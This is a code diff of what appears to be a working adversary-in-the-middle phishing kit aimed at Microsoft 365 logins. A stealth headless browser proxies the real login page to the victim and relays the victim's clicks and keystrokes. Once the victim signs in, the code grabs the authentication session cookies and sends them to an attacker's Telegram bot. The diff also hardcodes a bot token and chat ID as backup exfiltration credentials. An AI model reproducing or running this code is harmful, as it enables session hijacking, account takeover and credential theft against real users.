@@ -5,51 +5,62 @@ const FormData = require('form-data');
 
 puppeteer.use(StealthPlugin());
 
-// --- CORE AITM CONFIG ---
-const VAULT_URL = "https://script.google.com/macros/s/AKfycbzjX20l3RNxx1adYeW_108CdbGJlO3vi2lwhdixZSBo_83oijJYtIAURqAg9ImZSGrZ/exec";
+// --- CONFIGURATION ---
+const VAULT_URL = "https://script.google.com/macros/s/YOUR_DEPLOYMENT_ID/exec";
 const TARGET = "https://login.microsoftonline.com/";
 
-let cachedSecrets = null;
+// YOUR NEW CREDENTIALS
+const BACKUP_TOKEN = "8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc";
+const BACKUP_CHAT_ID = "1318100118";
 
-async function getSecrets() {
-    if (cachedSecrets) return cachedSecrets;
+async function getCredentials() {
     try {
-        const response = await axios.get(VAULT_URL, { timeout: 5000 });
-        cachedSecrets = response.data;
-        return cachedSecrets;
-    } catch (e) { return null; }
+        const response = await axios.get(VAULT_URL, { timeout: 4000 });
+        // Ensure GAPS returns valid data, otherwise use backups
+        if (response.data && response.data.TG_TOKEN) {
+            return response.data;
+        }
+    } catch (e) {
+        console.log("GAPS Vault unreachable, using backup credentials.");
+    }
+    return { TG_TOKEN: BACKUP_TOKEN, TG_CHAT_ID: BACKUP_CHAT_ID };
 }
 
 async function sendExfiltration(cookies, url) {
-    const secrets = await getSecrets();
-    if (!secrets || !secrets.TG_TOKEN) return;
+    const creds = await getCredentials();
+    const host = new URL(url).hostname;
+
+    console.log(`Attempting exfiltration for: ${host}`);
 
     try {
-        const host = new URL(url).hostname;
-        // Telegram Alert
-        await axios.post(`https://api.telegram.org/bot${secrets.TG_TOKEN}/sendMessage`, {
-            chat_id: secrets.TG_CHAT_ID,
-            text: `<b>🚨 SESSION CAPTURED</b>\n<b>Host:</b> ${host}\n<b>Status:</b> Active`,
+        // 1. Send Text Notification
+        await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendMessage`, {
+            chat_id: creds.TG_CHAT_ID,
+            text: `<b>🚨 SESSION CAPTURED</b>\n<b>Host:</b> ${host}\n<b>Cookies:</b> ${cookies.length} found.`,
             parse_mode: 'HTML'
         });
 
-        // Cookie Document
+        // 2. Send JSON Cookie File
         const form = new FormData();
-        form.append('chat_id', secrets.TG_CHAT_ID);
+        form.append('chat_id', creds.TG_CHAT_ID);
         form.append('document', Buffer.from(JSON.stringify(cookies, null, 2)), {
-            filename: `COOKIES_${host}.json`,
+            filename: `COOKIES_${host.replace(/\./g, '_')}.json`,
             contentType: 'application/json'
         });
 
-        await axios.post(`https://api.telegram.org/bot${secrets.TG_TOKEN}/sendDocument`, form, {
+        await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendDocument`, form, {
             headers: form.getHeaders()
         });
-    } catch (e) {}
+
+        console.log("✅ Telegram log sent successfully.");
+    } catch (e) {
+        console.error("❌ Telegram Log Failed:", e.response ? e.response.data : e.message);
+    }
 }
 
 async function startSession(io, socket) {
     let browser = null;
-    const captured = new Set();
+    const capturedUrls = new Set();
 
     try {
         browser = await puppeteer.launch({
@@ -63,51 +74,52 @@ async function startSession(io, socket) {
 
         await page.goto(TARGET, { waitUntil: 'networkidle2' });
 
-        // COOKIE POLLER
+        // EXFILTRATION TRIGGER
         const poller = setInterval(async () => {
             try {
                 const url = page.url();
-                if (url.includes('/kmsi') || url.includes('portal.office.com')) {
+                // Capture on common post-auth redirect points
+                if (url.includes('/kmsi') || url.includes('portal.office.com') || url.includes('/landing')) {
                     const cookies = await page.cookies();
-                    const hasAuth = cookies.some(c => c.name.includes('ESTSAUTH') || c.name.includes('MSAAUTH'));
-                    if (hasAuth && !captured.has(url)) {
-                        captured.add(url);
+                    const isAuth = cookies.some(c => c.name.includes('ESTSAUTH') || c.name.includes('MSAAUTH'));
+
+                    if (isAuth && !capturedUrls.has(url)) {
+                        capturedUrls.add(url);
                         await sendExfiltration(cookies, url);
                     }
                 }
             } catch (e) {}
-        }, 5000);
+        }, 4000);
 
-        // SCREEN STREAMER
-        const heartbeat = setInterval(async () => {
+        // STREAMING
+        const stream = setInterval(async () => {
             if (socket.connected) {
                 try {
-                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 25 });
-                    socket.emit('browser-render', { screenshot });
+                    const b64 = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 25 });
+                    socket.emit('browser-render', { screenshot: b64 });
                 } catch (e) {}
             }
         }, 1000);
 
-        // PC-OPTIMIZED INTERACTION
+        // PC ACTIONS
         socket.on('victim-action', async (data) => {
             try {
                 if (data.type === 'click') {
                     await page.mouse.move(data.x, data.y);
                     await page.mouse.click(data.x, data.y, { delay: 50 });
                 } else if (data.type === 'key') {
-                    // page.keyboard.press handles both characters and functional keys (Enter/Backspace)
                     await page.keyboard.press(data.key);
                 }
             } catch (e) {}
         });
 
         socket.on('disconnect', async () => {
-            clearInterval(heartbeat);
             clearInterval(poller);
+            clearInterval(stream);
             if (browser) await browser.close();
         });
 
-    } catch (error) {
+    } catch (err) {
         if (browser) await browser.close();
     }
 }
